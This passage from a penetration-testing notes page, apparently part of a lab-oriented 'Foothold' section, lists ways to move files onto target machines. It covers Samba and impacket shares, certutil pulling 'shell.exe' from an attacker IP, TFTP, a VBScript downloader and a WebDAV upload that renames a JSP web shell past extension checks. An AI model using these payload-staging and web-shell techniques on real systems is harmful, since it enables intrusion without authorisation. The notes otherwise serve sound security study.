map to <span class="nv">guest</span> <span class="o">=</span> bad user
name resolve <span class="nv">order</span> <span class="o">=</span> bcast host
dns <span class="nv">proxy</span> <span class="o">=</span> no
<span class="nb">bind</span> interfaces <span class="nv">only</span> <span class="o">=</span> yes

<span class="o">[</span>gorilla<span class="o">]</span>
<span class="nv">path</span> <span class="o">=</span> /var/www/html/pub
<span class="nv">writable</span> <span class="o">=</span> no
guest <span class="nv">ok</span> <span class="o">=</span> yes
guest <span class="nv">only</span> <span class="o">=</span> yes
<span class="nb">read</span> <span class="nv">only</span> <span class="o">=</span> yes
directory <span class="nv">mode</span> <span class="o">=</span> <span class="m">0555</span>
force <span class="nv">user</span> <span class="o">=</span> nobody
</pre></div>
</div>
</section>
<section id="set-folder-permissions">
<h3>Set folder permissions<a class="headerlink" href="#set-folder-permissions" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>chmod <span class="m">0555</span> /var/www/html/pub
chown -R nobody:nogroup /var/www/html/pub
</pre></div>
</div>
</section>
<section id="restart-samba">
<h3>Restart Samba<a class="headerlink" href="#restart-samba" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>service smbd start
service smdb stop
service smbd restart
</pre></div>
</div>
</section>
<section id="monitor-logs-for-errors">
<h3>Monitor logs for errors<a class="headerlink" href="#monitor-logs-for-errors" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tail -f /var/log/samba/log.&lt;site-name&gt;
</pre></div>
</div>
</section>
</section>
<section id="impacket-smb">
<h2>Impacket SMB<a class="headerlink" href="#impacket-smb" title="Permalink to this headline">¶</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>impacket-smbserver -ip <span class="m">10</span>.10.14.4 -smb2support gorilla /var/www/html/pub
</pre></div>
</div>
<p>Then use <code class="docutils literal notranslate"><span class="pre">\\10.10.14.4\gorilla\&lt;file-name&gt;</span></code> as the location to send your file from, or to have the target grab from you.</p>
<p>Mounting a remote share is pretty simple as well assuming you know the name of the share:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mkdir /mnt/10.10.10.123
mount -t cifs //10.10.10.123/general /mnt/10.10.10.123
</pre></div>
</div>
<p>Now we can browse the share inside our terminal.</p>
</section>
<section id="certutil">
<h2>certutil<a class="headerlink" href="#certutil" title="Permalink to this headline">¶</a></h2>
<p>Genuinely forget that this is a thing. If you’re on a Windows machine then this may be a viable option for transferring files from our host system to the target:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certutil -urlcache -f “http://10.10.14.14/shell.exe” shell.exe
</pre></div>
</div>
<p>That’s it really.</p>
<p>It might not always be a thing, but on older Windows machines it should be present.</p>
</section>
<section id="tftp">
<h2>TFTP<a class="headerlink" href="#tftp" title="Permalink to this headline">¶</a></h2>
<p>Trivial File Transfer Protocol is a nice way to get around file transfers on Windows assuming it’s installed on the sytem. It’s basically FTP but it runs on UDP instead of TCP.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>service atftpd start
</pre></div>
</div>
<p>On Kali by default TFTP is configured from the following location:</p>
<p><code class="docutils literal notranslate"><span class="pre">/etc/default/atftpd</span></code></p>
<p>And it serves files (by default) from:</p>
<p><code class="docutils literal notranslate"><span class="pre">/srv/tftp</span></code></p>
<p>To download files from a server we can do:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
</pre></div>
</div>
<p>And to upload a file to the server we can do:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tftp -i host PUT C:%homepath%file location_of_file_on_tftp_server
</pre></div>
</div>
</section>
<section id="sftp">
<h2>SFTP<a class="headerlink" href="#sftp" title="Permalink to this headline">¶</a></h2>
<p><a class="reference external" href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server">How To Use SFTP to Securely Transfer Files with a Remote Server</a></p>
</section>
<section id="visualbasic">
<h2>VisualBasic<a class="headerlink" href="#visualbasic" title="Permalink to this headline">¶</a></h2>
<p>If push comes to shove, we can use something like the following:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Set <span class="nv">args</span> <span class="o">=</span> Wscript.Arguments 
<span class="nv">Url</span> <span class="o">=</span> <span class="s2">&quot;http://domain/file&quot;</span> dim xHttp: 
Set <span class="nv">xHttp</span> <span class="o">=</span> createobject<span class="o">(</span><span class="s2">&quot;Microsoft.XMLHTTP&quot;</span><span class="o">)</span> dim bStrm: 
Set <span class="nv">bStrm</span> <span class="o">=</span> createobject<span class="o">(</span><span class="s2">&quot;Adodb.Stream&quot;</span><span class="o">)</span> 
xHttp.Open <span class="s2">&quot;GET&quot;</span>, Url, False xHttp.Send with bStrm     
.type <span class="o">=</span> <span class="m">1</span> <span class="s1">&#39;     </span>
<span class="s1">.open     </span>
<span class="s1">.write xHttp.responseBody     </span>
<span class="s1">.savetofile &quot; C:%homepath%file&quot;, 2 &#39;</span> end with
</pre></div>
</div>
</section>
<section id="webdav">
<h2>WebDAV<a class="headerlink" href="#webdav" title="Permalink to this headline">¶</a></h2>
<p>We can sometimes use WebDAV to upload files to a system.</p>
<p>If it’s enabled use a tool like cadaver to PUT a file onto the server, usually there are some restrictions on file uploads/execution, bu it doesn’t recheck the file after the initial upload, so just use the mv command to change the extension.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$&gt; cadaver http://192.168.56.5

put shell.jsp.txt
mv shell.jsp.txt shell.jsp
</pre></div>
</div>
</section>
</section>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            kernelName: "python3",
            path: "./pentesting/foothold"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'python3'</script>

              </div>
              
        
            <!-- Previous / next buttons -->
<div class='prev-next-area'> 
    <a class='left-prev' id="prev-link" href="index.html" title="previous page">
        <i class="fas fa-angle-left"></i>
        <div class="prev-next-info">
            <p class="prev-next-subtitle">previous</p>
            <p class="prev-next-title">005 Foothold</p>
        </div>
    </a>
    <a class='right-next' id="next-link" href="pivot.html" title="next page">
    <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">Pivotting 101</p>
    </div>
    <i class="fas fa-angle-right"></i>
    </a>
</div>
        
        </div>
    </div>
    <footer class="footer">
    <div class="container">
      <p>
        
          By AppSec<br/>
        
            &copy; Copyright 2021.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>
  
  <script src="../../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>

  </body>
</html>